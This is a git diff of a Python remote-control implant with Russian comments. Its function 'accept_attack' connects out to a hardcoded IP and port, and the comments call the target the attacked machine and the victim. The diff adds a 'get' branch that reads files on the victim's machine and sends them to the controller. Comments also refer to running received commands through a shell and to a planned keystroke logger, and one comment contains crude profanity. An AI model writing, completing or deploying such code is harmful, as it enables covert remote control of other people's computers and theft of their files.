@@ -56,7 +56,7 @@ def accept_attack(ip, port):
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     sock.connect((ip, port))
     #дописать в лог айпи атакованной машины и ее порт
-    sock.send(("The pc is under control").encode())
+    #sock.send(("The pc is under control").encode())
 
     #как только жертва под контролем начинаем писать лог нажатий
     #на текущем этапе не работает, запускать в соседнем треде, что бы основной не блокировался
@@ -78,21 +78,37 @@ def accept_attack(ip, port):
                 except Exception as e:
                     print(e)
             if data[:4].decode() == "send":
-                print("Проалились в подменю send на стороне клиента")
+                pass
+            if data[:3].decode() == "get":
+                print("Попали в GET")
 
                 command, file_name = data.decode().split(" ")
-                print(file_name, " file_name")
+                print(command, " команда")
+                print(file_name, " файл_нейм")
 
-                file = open(file_name, 'wb')
-                data = sock.recv(1024000000)
-                print(data, " data")
-                print(len(data), " len data")
-                file.write(data)
 
-                file.close()
+                #s.connect(('localhost', 9090))
+                op = open(file_name, 'rb')
+                while (data):
+                    print("Мы в начале while")
+                    data = op.read(1024)
+                    print(data, "data")
+                    if not data:
+                        print("Мы в брейк")
+                        time.sleep(1)
+                        sock.send(b" ")
+                        break
+                    sock.send(data)
+                    print("Мы в конце while")
+                sock.send(b"azaza")
+                op.close()
+                sock.send(b"")
+                sock.send(b"lol")
+                sock.shutdown(socket.SHUT_WR) #СУКА НАХУЙ В РОТ ЕБАЛ
+                #sock.close()
+                print("Мы в конце цикла GET, файл отправлен")
 
-                print("В конце блока send, клиент, значит файл получен")
-
+                #s.shutdown(socket.SHUT_WR)
             else:
                 #далее открывается shell и запускаются команды, Popen берет строку, поэтому конвертим
                 #шел указываем True (хз пока зачем), может быть даем видеть атакуемому командную строку.
@@ -121,4 +137,15 @@ accept_attack("109.237.25.179", 9090)
                         print("Мы в break")
                         break
                     file.write(data)
-                    print("Мы после write")     """
+                    print("Мы после write")     
+                    
+                    
+                    
+                    
+                    
+                data = sock.recv(1024000000)
+                print(data, " data")
+                print(len(data), " len data")
+                file.write(data)
+
+                file.close()"""
